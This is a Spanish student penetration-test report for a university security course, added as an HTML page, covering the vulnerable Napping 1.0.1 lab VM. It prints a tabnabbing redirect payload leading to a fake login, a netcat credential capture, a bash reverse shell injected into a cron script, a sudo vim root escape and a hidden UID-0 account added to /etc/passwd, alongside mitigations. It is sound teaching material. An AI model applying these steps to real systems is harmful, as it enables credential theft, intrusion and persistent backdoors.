@@ -1,0 +1,777 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>ACTIVIDAD 11 | Pentesting de Napping 1.0.1</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link class="stylesheet" rel="stylesheet" href="assets/css/main.css" />
+    <style>
+        /* ESTILO PERSONALIZADO PARA EL MENÚ TIPO BARRA NEGRA */
+        #nav {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            padding: 0.5em 0;
+        }
+
+        #nav ul li a {
+            color: #ffffff !important;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        #nav ul li a:hover {
+            background-color: #333333;
+        }
+
+        /* Dropdown CSS Custom */
+        .dropdown-hover {
+            display: inline-block;
+            position: relative;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #000000;
+            min-width: 170px;
+            z-index: 1000;
+            top: 100%;
+            left: 0;
+            padding: 0;
+            margin: 0;
+            list-style: none;
+            border-radius: 4px;
+        }
+
+        .dropdown-content li {
+            display: block;
+        }
+
+        .dropdown-content li a {
+            color: #ffffff !important;
+            padding: 10px 15px !important;
+            text-decoration: none;
+            display: block;
+            font-size: 0.9em;
+        }
+
+        .dropdown-content li a:hover {
+            background-color: #333333 !important;
+        }
+
+        .dropdown-hover:hover .dropdown-content {
+            display: block;
+        }
+
+        hr {
+            border-top: solid 1px #ccc !important;
+            opacity: 1;
+            margin: 2em 0;
+        }
+
+        .content-article {
+            background: #ffffff;
+            padding: 3em;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+            overflow-x: auto;
+            color: #333333;
+        }
+
+        .content-article h2 {
+            color: #e63946;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        .content-article h3 {
+            color: #1d3557;
+            margin-top: 1.8em;
+            font-size: 1.4em;
+            border-left: 4px solid #e63946;
+            padding-left: 10px;
+        }
+
+        .content-article h4 {
+            color: #2c3e50;
+            font-size: 1.15em;
+            margin-top: 1.2em;
+            font-weight: bold;
+        }
+
+        .pdf-btn {
+            background-color: #d32f2f;
+            color: white !important;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 2em;
+            font-weight: bold;
+            transition: background-color 0.2s, transform 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .pdf-btn:hover {
+            background-color: #b71c1c;
+            transform: translateY(-2px);
+        }
+
+        /* Portada interna style */
+        .cover-info {
+            text-align: center;
+            margin-bottom: 3em;
+            padding: 2.5em;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .cover-info h1 {
+            font-size: 2em;
+            color: #1d3557;
+            margin-bottom: 0.5em;
+            font-weight: bold;
+        }
+
+        .cover-info h2 {
+            font-size: 1.3em;
+            color: #457b9d;
+            border-bottom: none;
+            margin-bottom: 0.5em;
+        }
+
+        .cover-info p {
+            margin: 0.3em 0;
+            color: #4a4a4a;
+            font-size: 1.05em;
+        }
+
+        /* Tabnabbing Attack Diagram */
+        .tabnabbing-wrapper {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 2em;
+            margin: 2em 0;
+        }
+
+        .tabnabbing-diagram {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1.5em;
+            position: relative;
+            margin: 1.5em 0;
+        }
+
+        @media screen and (max-width: 980px) {
+            .tabnabbing-diagram {
+                flex-direction: column;
+                gap: 2em;
+            }
+            .tabnabbing-arrow {
+                transform: rotate(90deg) !important;
+            }
+        }
+
+        .tabnabbing-box {
+            background: #ffffff;
+            border: 2px solid #1d3557;
+            border-radius: 6px;
+            padding: 1.2em;
+            width: 190px;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
+            transition: all 0.2s ease;
+            position: relative;
+            z-index: 10;
+        }
+
+        .tabnabbing-box:hover {
+            transform: scale(1.05);
+            border-color: #e63946;
+        }
+
+        .tabnabbing-box .icon {
+            font-size: 1.8em;
+            color: #e63946;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .tabnabbing-box .title {
+            font-weight: bold;
+            font-size: 0.85em;
+            color: #1e293b;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .tabnabbing-box .desc {
+            font-size: 0.7em;
+            color: #64748b;
+            margin-top: 4px;
+            line-height: 1.3;
+        }
+
+        .tabnabbing-arrow {
+            font-size: 1.5em;
+            color: #94a3b8;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: rotate(0deg);
+            transition: color 0.2s;
+        }
+
+        .tabnabbing-arrow:hover {
+            color: #e63946;
+        }
+
+        /* Visual Timeline */
+        .attack-timeline {
+            position: relative;
+            max-width: 800px;
+            margin: 2.5em auto;
+            padding: 0;
+            list-style: none;
+        }
+
+        .attack-timeline::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background: #e2e8f0;
+            left: 30px;
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 2.5em;
+            padding-left: 60px;
+        }
+
+        .timeline-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .timeline-badge {
+            width: 40px;
+            height: 40px;
+            position: absolute;
+            background: #1d3557;
+            border: 4px solid #ffffff;
+            border-radius: 50%;
+            left: 12px;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 0.85em;
+            font-weight: bold;
+            box-shadow: 0 0 0 3px #cbd5e1;
+        }
+
+        .timeline-item.root-escalation .timeline-badge {
+            background: #e63946;
+            box-shadow: 0 0 0 3px #fecaca;
+        }
+
+        .timeline-panel {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            padding: 1.5em;
+            position: relative;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
+            transition: all 0.2s ease;
+        }
+
+        .timeline-panel:hover {
+            background: #ffffff;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+            border-color: #cbd5e1;
+        }
+
+        .timeline-panel h4 {
+            margin-top: 0;
+            margin-bottom: 0.5em;
+            color: #1d3557;
+            font-size: 1.1em;
+        }
+
+        .timeline-item.root-escalation .timeline-panel h4 {
+            color: #e63946;
+        }
+
+        .timeline-panel p {
+            font-size: 0.9em;
+            color: #475569;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        .terminal-block {
+            background: #0f172a;
+            color: #38bdf8;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.8em;
+            padding: 10px 15px;
+            border-radius: 4px;
+            margin-top: 0.8em;
+            border-left: 3px solid #0ea5e9;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* CIA Triad Boxes */
+        .cia-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5em;
+            margin: 2em 0;
+        }
+
+        @media screen and (max-width: 980px) {
+            .cia-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .cia-box {
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 1.8em;
+            border-top: 5px solid #cbd5e1;
+            text-align: center;
+        }
+
+        .cia-box.confidentiality {
+            border-top-color: #e63946;
+        }
+
+        .cia-box.integrity {
+            border-top-color: #f59e0b;
+        }
+
+        .cia-box.availability {
+            border-top-color: #3b82f6;
+        }
+
+        .cia-box h4 {
+            font-size: 1.2em;
+            margin-top: 0;
+            margin-bottom: 0.8em;
+            color: #1e293b;
+        }
+
+        .cia-box .badge-cia {
+            font-size: 0.75em;
+            font-weight: bold;
+            padding: 3px 10px;
+            border-radius: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            display: inline-block;
+            margin-bottom: 1em;
+        }
+
+        .badge-cia.critical {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .cia-box p {
+            font-size: 0.88em;
+            color: #475569;
+            line-height: 1.4;
+            margin: 0;
+            text-align: left;
+        }
+
+        /* Table styles */
+        table.pentest-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            font-size: 0.95em;
+        }
+
+        table.pentest-table th {
+            background: #1d3557;
+            color: #ffffff;
+            padding: 12px;
+            text-align: left;
+            font-weight: bold;
+        }
+
+        table.pentest-table td {
+            padding: 12px;
+            border-bottom: 1px solid #cbd5e1;
+            vertical-align: top;
+        }
+
+        table.pentest-table tr:nth-child(even) {
+            background: #f8fafc;
+        }
+
+        .badge-severity {
+            font-size: 0.75em;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        .badge-severity.critical {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .badge-severity.high {
+            background: #ffedd5;
+            color: #c2410c;
+        }
+
+        .badge-severity.medium {
+            background: #fef3c7;
+            color: #b45309;
+        }
+
+        @media print {
+            #nav, .pdf-btn, p style*="text-align: left", footer, .attack-timeline::before, .tabnabbing-arrow {
+                display: none !important;
+            }
+            body {
+                background: white;
+                color: black;
+            }
+            .content-article {
+                box-shadow: none;
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+
+<body class="is-preload">
+
+    <nav id="nav">
+        <ul class="container">
+            <li><a href="index.html">Inicio</a></li>
+            <li><a href="PF02.html">PF02</a></li>
+            <li><a href="PF03.html">PF03</a></li>
+            <li><a href="Final.html">Final</a></li>
+            <li><a href="actividades.html">Actividades</a></li>
+            <li><a href="proyectos.html">Proyectos</a></li>
+            <li><a href="certificaciones.html">Certificaciones</a></li>
+            <li class="dropdown-hover">
+                <a href="halloffame.html">Hall of Fame</a>
+                <ul class="dropdown-content">
+                    <li><a href="sqlinjection.html">SQL Injection</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+
+    <article id="top" class="wrapper style1">
+        <div class="container">
+            <header>
+                <p style="text-align: left;"><a href="PF02.html">← Volver a PF02</a></p>
+                <h2>ACTIVIDAD 11: PENTESTING DE NAPPING 1.0.1</h2>
+                <p>Análisis forense y simulación de ataque avanzado (Tabnabbing, movimiento lateral cron query.py y escalada Vim root).</p>
+            </header>
+
+            <div class="row">
+                <div class="col-12">
+                    <div class="content-article">
+
+                        <!-- Portada Académica -->
+                        <div class="cover-info">
+                            <h2>ACTIVIDAD 11</h2>
+                            <h1>INFORME FORENSE Y DE RED TEAM: PENTESTING DE NAPPING VM</h1>
+                            <p><strong>Alumno:</strong> Alonso Castillo Omar Karim (179033)</p>
+                            <br>
+                            <p><strong>Materia:</strong> CNO V – Seguridad Informática</p>
+                            <p><strong>Profesor:</strong> Mtro. Servando López Contreras</p>
+                            <br>
+                            <p>Universidad Politécnica de San Luis Potosí</p>
+                        </div>
+
+                        <hr />
+
+                        <!-- Resumen Ejecutivo -->
+                        <h3>1. Resumen Ejecutivo (Executive Summary)</h3>
+                        <p>El presente documento técnico detalla los resultados, procedimientos y evidencias de la auditoría de seguridad y pruebas de penetración avanzada realizadas sobre la máquina virtual vulnerable **Napping 1.0.1**. La evaluación simuló un escenario de adversario persistente externo sin credenciales previas en una red local controlada con dirección IP **192.168.56.103**.</p>
+                        
+                        <p>Durante el engagement se identificó y explotó con éxito una brecha de **Tabnabbing (Tab Hijacking)** en la capa web, lo que permitió capturar credenciales de acceso administrativo del usuario `daniel`. Posteriormente, mediante la edición de un script cron automatizado con permisos mal asignados, se realizó un **movimiento lateral** al usuario `adrian`. Finalmente, abusando de privilegios delegados sin clave (`NOPASSWD`) en el editor `vim` bajo `sudoers`, se obtuvo **acceso total de superusuario (root)** en el servidor y se inyectó una cuenta administrativa oculta para persistencia.</p>
+
+                        <hr />
+
+                        <!-- Alcance y Metodología -->
+                        <h3>2. Alcance (Scope) y Metodología</h3>
+                        <p>El alcance de la presente evaluación técnica e independiente se limitó de forma estricta al host local vulnerable `Napping` con dirección IP **192.168.56.103** en un entorno de red *Host-Only* en VirtualBox. La metodología aplicada se fundamentó de forma robusta bajo los estándares de la **OWASP Web Security Testing Guide (WSTG)** y el **PTES (Penetration Testing Execution Standard)**, recorriendo las fases secuenciales de Descubrimiento/ARP, Enumeración profunda de servicios, Explotación web, Movimiento lateral local, Escalada de privilegios y Análisis CIA.</p>
+
+                        <hr />
+
+                        <!-- Ataque de Tabnabbing -->
+                        <h3>3. El Vector de Explotación: Ataque de Tabnabbing</h3>
+                        <p>El punto de apoyo inicial en el servidor se obtuvo explotando una vulnerabilidad de **Tabnabbing (secuestro de pestañas)** en el formulario de envío de enlaces ubicado en `welcome.php`. Esta técnica aprovecha una mala configuración que no sanitiza la relación de pestañas del navegador, permitiendo al objeto `window.opener` manipular la página origen de la víctima.</p>
+
+                        <!-- Diagrama Visual de Tabnabbing -->
+                        <div class="tabnabbing-wrapper">
+                            <h4 style="text-align: center; margin-top:0; color:#1d3557;"><i class="icon solid fa-project-diagram" style="margin-right: 5px;"></i> Flujo del Ataque de Tabnabbing</h4>
+                            <div class="tabnabbing-diagram">
+                                
+                                <div class="tabnabbing-box">
+                                    <span class="icon"><i class="icon solid fa-user-tie"></i></span>
+                                    <span class="title">1. Administrador</span>
+                                    <span class="desc">Víctima autenticada en welcome.php que abre enlace sospechoso enviado.</span>
+                                </div>
+
+                                <div class="tabnabbing-arrow"><i class="icon solid fa-arrow-right"></i></div>
+
+                                <div class="tabnabbing-box" style="border-color: #e63946;">
+                                    <span class="icon"><i class="icon solid fa-file-code"></i></span>
+                                    <span class="title">2. Payload HTML</span>
+                                    <span class="desc">payload.html se ejecuta en segundo plano redirigiendo la pestaña origen.</span>
+                                </div>
+
+                                <div class="tabnabbing-arrow"><i class="icon solid fa-arrow-right"></i></div>
+
+                                <div class="tabnabbing-box" style="border-color: #e63946;">
+                                    <span class="icon"><i class="icon solid fa-mask"></i></span>
+                                    <span class="title">3. Fake Login</span>
+                                    <span class="desc">La pestaña original carga un home.html falso que roba la clave.</span>
+                                </div>
+
+                                <div class="tabnabbing-arrow"><i class="icon solid fa-arrow-right"></i></div>
+
+                                <div class="tabnabbing-box">
+                                    <span class="icon"><i class="icon solid fa-terminal"></i></span>
+                                    <span class="title">4. Atacante</span>
+                                    <span class="desc">Netcat en puerto 8000 recibe las credenciales en texto plano POST.</span>
+                                </div>
+
+                            </div>
+                        </div>
+
+                        <p><strong>Script inyectado en el Payload (payload.html):</strong></p>
+                        <div class="terminal-block">&lt;script&gt;
+  window.opener.parent.location.replace('http://192.168.56.101:8000/home.html');
+&lt;/script&gt;</div>
+                        <p>Una vez enviado este enlace al formulario, el administrador simulado interactuó con él. Su pestaña original fue redirigida a nuestro formulario de login falso, ingresando sus credenciales e interceptándose el tráfico POST en nuestro listener Netcat local, fugando la contraseña del usuario `daniel`:</p>
+                        <div class="terminal-block">nc -lvnp 8000
+==> Connection Received! Intercepted POST:
+==> username: daniel
+==> password: C@ughtm3napping123</div>
+
+                        <hr />
+
+                        <!-- Línea de Tiempo de la Intrusión -->
+                        <h3>4. Línea de Tiempo Forense del Ataque y Escalada</h3>
+                        <p>A continuación se describe la bitácora técnica de la intrusión y los movimientos realizados localmente por el atacante hasta alcanzar privilegios root:</p>
+
+                        <ul class="attack-timeline">
+                            
+                            <li class="timeline-item">
+                                <div class="timeline-badge">01</div>
+                                <div class="timeline-panel">
+                                    <h4>Acceso Inicial por SSH</h4>
+                                    <p>Usando las credenciales de `daniel` interceptadas en el Tabnabbing, se logró establecer una shell interactiva remota limpia por SSH:</p>
+                                    <div class="terminal-block">ssh daniel@192.168.56.103
+==> login successful (Access as standard user 'daniel')</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">02</div>
+                                <div class="timeline-panel">
+                                    <h4>Enumeración y Movimiento Lateral (adrian)</h4>
+                                    <p>Se exploró el sistema de archivos local. Bajo el directorio `/home/adrian` se ubicó el script `query.py` ejecutado de manera automatizada como un **cron job** bajo el usuario `adrian`. Se descubrió que el script tenía permisos de escritura abiertos para el grupo `administrators`, al cual pertenece `daniel`:</p>
+                                    <div class="terminal-block">ls -la /home/adrian/query.py
+==> -rw-rw-r-- 1 adrian administrators 104 query.py (Writable!)</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">03</div>
+                                <div class="timeline-panel">
+                                    <h4>Secuestro de Script y Reverse Shell</h4>
+                                    <p>Se editó `query.py` para inyectar una llamada al sistema que ejecute un archivo de shell inversa en Bash ubicado en `/dev/shm` (memoria temporal compartida), configurando un listener de Netcat a la escucha para recibir la shell:</p>
+                                    <div class="terminal-block"># Edición de query.py
+import os
+os.system('/usr/bin/bash /dev/shm/connection.sh')
+
+# Contenido de /dev/shm/connection.sh
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/192.168.56.101/8000 0>&1'
+
+# Listener Atacante:
+nc -lvnp 8000 ==> Connection received! Shell established as 'adrian'</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">04</div>
+                                <div class="timeline-panel">
+                                    <h4>Estabilización de Consola (TTY)</h4>
+                                    <p>Una vez recibida la shell inversa de `adrian`, se procedió a estabilizar la consola utilizando el intérprete de Python para interactuar de forma segura:</p>
+                                    <div class="terminal-block">python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + Z (Suspender)
+stty raw -echo; fg
+==> Stable interactve TTY console active.</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item root-escalation">
+                                <div class="timeline-badge"><i class="icon solid fa-skull"></i></div>
+                                <div class="timeline-panel">
+                                    <h4>Escalada de Privilegios a Root (Bypass de Vim en Sudoers)</h4>
+                                    <p>Se auditó el perfil del usuario `adrian` ejecutando `sudo -l`. Se descubrió una regla crítica en la directiva de `sudoers` que le permitía ejecutar el editor `/usr/bin/vim` como root sin requerir contraseña (`NOPASSWD`). Usando la técnica documentada en **GTFOBins**, se escapó del editor para abrir una consola como root:</p>
+                                    <div class="terminal-block">adrian@napping:~$ sudo -l
+==> (root) NOPASSWD: /usr/bin/vim
+
+# Explotación de Vim
+sudo /usr/bin/vim -c ':!/bin/sh'
+whoami ==> root (¡Acceso root total establecido!)</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">06</div>
+                                <div class="timeline-panel">
+                                    <h4>Establecimiento de Persistencia Administrativa</h4>
+                                    <p>Para garantizar el acceso persistente ante un eventual cambio de claves o reinicio, se añadió un usuario administrativo oculto con UID/GID 0 en `/etc/passwd` denominado `Equipo4`:</p>
+                                    <div class="terminal-block">echo "Equipo4:\$1\$6jZ...:0:0:root:/root:/bin/bash" >> /etc/passwd
+cat /etc/passwd | grep Equipo4 ==> Persistence validated!</div>
+                                </div>
+                            </li>
+
+                        </ul>
+
+                        <hr />
+
+                        <!-- Análisis de Impacto -->
+                        <h3>5. Análisis de Impacto (Modelo CIA)</h3>
+                        <p>El compromiso absoluto de la máquina virtual Napping por el atacante se estructura bajo los pilares fundamentales del modelo CIA:</p>
+                        
+                        <div class="cia-grid">
+                            <div class="cia-box confidentiality">
+                                <h4>Confidencialidad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>Exposición total del sistema de archivos. Se comprobó la presencia de credenciales de bases de datos hardcodeadas en texto plano en scripts administrativos del sistema (como en el archivo `del_users.py` que exponía usuario "adrian" y contraseña de base de datos), permitiendo el robo masivo de información.</p>
+                            </div>
+                            <div class="cia-box integrity">
+                                <h4>Integridad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>Capacidad de alteración lógica completa. El atacante modificó query.py e inyectó un usuario root permanente en `/etc/passwd`. Un actor hostil tiene privilegios para borrar bitácoras de logs, reescribir la web y alterar la veracidad de los datos transaccionales del negocio.</p>
+                            </div>
+                            <div class="cia-box availability">
+                                <h4>Disponibilidad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>El control del usuario root permite apagar los servidores web, inhabilitar servicios o detonar la instrucción destructiva TRUNCATE TABLE detectada en scripts del servidor, causando una interrupción total instantánea y daños catastróficos a las bases de datos de la empresa.</p>
+                            </div>
+                        </div>
+
+                        <hr />
+
+                        <!-- Tabla de Vulnerabilidades -->
+                        <h3>6. Inventario de Hallazgos y Vulnerabilidades</h3>
+                        <p>A continuación se detallan de forma estructurada los cuatro hallazgos técnicos reportados en la auditoría, ordenados por nivel de severidad:</p>
+
+                        <table class="pentest-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Vulnerabilidad Detectada</th>
+                                    <th>Severidad</th>
+                                    <th>Evidencia Técnica en Campo</th>
+                                    <th>Recomendación de Mitigación</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>VULN-01</strong></td>
+                                    <td>Tabnabbing (Tab Hijacking) en formulario welcome.php</td>
+                                    <td><span class="badge-severity high">Alta</span></td>
+                                    <td>Explotación exitosa inyectando un payload HTML que manipula `window.opener.parent.location` para redirigir la sesión del admin.</td>
+                                    <td>Implementar en todos los enlaces salientes la directiva de seguridad `rel="noopener noreferrer"`. Sanitizar estrictamente el formulario de enlaces.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-02</strong></td>
+                                    <td>Asignación de permisos de escritura inseguros en script cron query.py</td>
+                                    <td><span class="badge-severity high">Alta</span></td>
+                                    <td>Permiso de escritura (-rw-rw-r--) concedido al grupo administrators en un script cron ejecutado por el usuario `adrian`.</td>
+                                    <td>Auditar y aplicar el principio de mínimo privilegio en el filesystem. Los scripts programados automáticos solo deben pertenecer y ser editables por su autor.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-03</strong></td>
+                                    <td>Directiva NOPASSWD en sudoers para herramienta interactiva Vim</td>
+                                    <td><span class="badge-severity critical">Crítica</span></td>
+                                    <td>Bypass exitoso y escalada vertical a root ejecutando el escape documentado en GTFOBins `sudo vim -c ':!/bin/sh'`.</td>
+                                    <td>Suprimir privilegios NOPASSWD en el archivo `/etc/sudoers` para editores de texto interactivos que permitan escapar a shell.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-04</strong></td>
+                                    <td>Credenciales de bases de datos hardcodeadas en texto plano en del_users.py</td>
+                                    <td><span class="badge-severity medium">Media</span></td>
+                                    <td>Archivo visible de administración exponiendo en claro las variables de conexión a base de datos (user y password).</td>
+                                    <td>Migrar la gestión de contraseñas de conexión a variables de entorno cifradas o sistemas de bóvedas de claves (Key Vaults).</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <hr />
+
+                        <!-- Conclusión -->
+                        <h3>7. Conclusión</h3>
+                        <p>El análisis de intrusión de **Napping 1.0.1** corrobora la enorme importancia de endurecer la configuración local de los servidores (*hardening*). Una falla inicial en la sanitización web de enlaces (Tabnabbing) actuó como la llave de entrada, pero fueron las **malas configuraciones locales** (permisos laxos de escritura de scripts grupales y privilegios NOPASSWD sobre Vim en sudoers) las que facilitaron al atacante desplazarse lateralmente y elevar privilegios de forma simple y catastrófica hasta el nivel de superusuario.</p>
+                        
+                        <p>La implementación rápida de mitigaciones sencillas (parámetro noopener, saneamiento de sudoers y uso de bóvedas de contraseñas) neutralizará de forma contundente la totalidad del árbol de ataque expuesto en este informe.</p>
+
+                        <!-- PDF Download Section -->
+                        <div style="text-align: center; margin-top: 3.5em; border-top: 1px solid #eee; padding-top: 2em;">
+                            <p style="font-size: 0.95em; color: #666;">¿Deseas consultar el informe forense completo y original de Napping VM en formato PDF?</p>
+                            <a href="Actividades/act11.pdf" class="pdf-btn" download>
+                                <i class="icon solid fa-file-pdf" style="margin-right: 8px;"></i> Descargar PDF Original (act11.pdf)
+                            </a>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article class="wrapper style4">
+        <div class="container medium">
+            <footer>
+                <ul id="copyright">
+                    <li>&copy; Alonso Castillo Omar Karim. Todos los derechos reservados.</li>
+                    <li>Diseño base: <a href="http://html5up.net">HTML5 UP</a></li>
+                </ul>
+            </footer>
+        </div>
+    </article>
+
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
